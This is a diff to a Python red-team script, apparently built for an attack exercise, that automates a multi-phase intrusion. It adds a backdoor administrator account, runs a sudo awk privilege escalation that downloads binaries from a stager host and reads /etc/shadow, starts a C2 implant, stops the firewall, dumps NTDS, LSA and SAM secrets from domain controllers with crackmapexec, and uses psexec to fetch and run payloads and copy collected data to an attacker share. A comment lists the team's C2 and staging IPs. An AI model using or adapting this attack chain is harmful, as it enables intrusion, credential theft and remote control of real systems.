@@ -68,7 +68,9 @@ def phaseOne():
 	dir = "dir"
 	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
 	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Cdont%5Fforget%2Etxt"
+	#Add evil admin account with password123! as  the password.
 	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
+	# Add evil admin to administrators group
 	addAdminGroup = "net%20localgroup%20administrators%20evil%20%2Fadd"
 	# Set up URL Encoded curl requests
 	curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
@@ -101,7 +103,7 @@ def phaseTwo():
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
 	#subprocess.run(cme, shell=True, text=True)
 	# Initial SSH Connection, enumerate, and then perform privesc
-	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://94.249.192.5:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
+	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://185.141.62.2:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
 	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/raichu &\")}'"
 	commands = [
 	"whoami",
@@ -151,10 +153,10 @@ def phaseThreept1():
 	#subprocess.run(cme, shell=True, text=True)
 	commands = [
 	"pwd",
-	"curl http://94.249.192.5:8000/pspy -o /tmp/pspy",
+	"curl http://185.141.62.2:8000/pspy -o /tmp/pspy",
 	"chmod +x /tmp/pspy",
 	"cd /var/log/mon",
-	"curl http://94.249.192.5:8000/backup.sh -o /var/log/mon/backup.sh"
+	"curl http://185.141.62.2:8000/backup.sh -o /var/log/mon/backup.sh"
 	]
 	client = paramiko.SSHClient()
 	try:
@@ -182,7 +184,7 @@ def phaseThreept2():
 	commands = [
 	"rm -rf /var/log/mon/backup.sh",
 	"sudo systemctl stop firewalld",
-	"curl http://94.249.192.5:8000/lucario -o /root/lucario",
+	"curl http://185.141.62.2:8000/lucario -o /root/lucario",
 	"chmod +x /root/lucario",
 	]
 	client = paramiko.SSHClient()
@@ -231,15 +233,14 @@ def phaseFour():
 	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
 
 def phaseFive():
-	DC1 = "208.11.20.100"
 	DC2 = "208.11.21.100"
 	#Change with evil domain admin from phase four.
 	username = "administrator"
 	password = "P@ssw0rd"
 	commands = [
-	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --ntds --obfs > ntds.txt'",
-	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --lsa --obfs > lsa.txt'",
-	f"bash -c 'crackmapexec smb {DC1} -u {username} -p {password} --sam --obfs > sam.txt'"
+	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --ntds --obfs > ntds.txt'",
+	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --lsa --obfs > lsa.txt'",
+	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --sam --obfs > sam.txt'"
 	]
 	for command in commands:
 		try:
@@ -247,31 +248,18 @@ def phaseFive():
 			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
 		except Exception as e:
 			pass
-	
-	psCommands = [
-	"iwr -uri http://94.249.192.5:8000/haunter.ps1 -out C:\Users\Administrator\Music\haunter.ps1",
-	"C:\Users\Administrator\Music\SharpHound.ps1 -c All"
-	"iwr -uri http://94.249.192.5:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe",
-	"C:\Users\Administrator\Pictures\porygon.exe"
-	]
-	for commands in psCommands:
-		try:
-			print(f"Running {command}. Sleeping for 30 seconds.")
-			# Add impacket-psexec command here.
-			subprocess.run(f"impacket-psexec {username}:{password}@{DC1} powershell.exe -c "+command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
-		except Exception as e:
-			pass
-			
-	dc2Commands = [
-	"iwr -uri http://94.249.192.5:8000/missingno.exe -out C:\Users\Administrator\Music\missingno.exe",
-	"C:\Users\Administrator\Music\missingno.exe"
-	]
-	for command in commands:
-		try:
-			print(f"Running {command}. Sleeping for 30 seconds.")
-			subprocess.run(f"impacket-psexec {username}:{password}@{DC2} powershell -c "+command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
-		except Exception as e:
-			pass
+
+	# The following is for DC2
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/haunter.exe -out C:\Users\Administrator\Music\haunter.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\haunter.exe --CollectionMethods All --zipfilename zubat.zip"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c copy-item -Path C:\Users\Administrator\Music\*.zip -destination \\185.141.62.2\tmp"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Pictures\porygon.exe"
+	# The following is for Maint Laptop 208.11.23.1
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/missingno.exe -out C:\Users\Administrator\Music\missingno.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\missingno.exe"
+
+
 
 def main():
 	# Ensure Sudo Usage
@@ -281,7 +269,27 @@ def main():
 	#phaseTwo()
 	#phaseThree()
 	#phaseFour()
-	phaseFive()
+	#phaseFive()
+	
+	'''
+			Red Team IP Space	
+	======================================
+	subnet / IP		|	Purpose
+	======================================
+	185.141.62.2	HTTP Stager Server
+	185.141.62.5	impacket-SMB Server
+	94.249.192.0/24	Kali 1 / Commando VMs
+	185.141.62.0/24	Kali 2 VMs
+	185.141.62.3	Phase 1 Attack System
+	94.249.192.3	Phase 2 Attack System
+	185.141.62.4	Phase 3 Attack System
+	94.249.192.1	Phase 4 Attack System
+	185.141.62.6	Phase 5 Attack System
+	94.249.192.2	Phase 6 Attack System
+	94.249.192.4	Phase 6 Attack System
+	94.249.192.5	Sliver C2 Server
+	======================================
+	'''
 
 if __name__ == "__main__":
 	main()
